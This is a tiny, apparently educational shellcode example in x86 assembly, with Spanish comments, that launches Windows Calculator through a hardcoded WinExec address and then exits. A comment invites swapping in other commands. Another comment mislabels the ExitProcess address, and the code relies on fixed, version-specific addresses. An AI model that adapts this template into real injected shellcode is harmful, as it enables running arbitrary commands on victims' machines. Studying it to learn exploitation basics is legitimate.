BITS 32                   ;especificamos que el code es 32bits
 
jmp short cmd             ;"cmd" a la pila
 
init:
   mov edx,7C8623ADh      ; 7C8623ADh>>direccion de WinExec a edx
   call edx               ; hacemos la llamada (recordemos que "cmd" esta en la pila)
   mov edx,7C81CAFAh      ; 7C8623ADh>>direccion de ExitProcess a edx
   call edx               ; salimos
 
cmd:
   CALL init
   db 'calc',00h          ; obviamente aqui podriamos a?adir otros comandos, eso ya seria parte de su ingenio
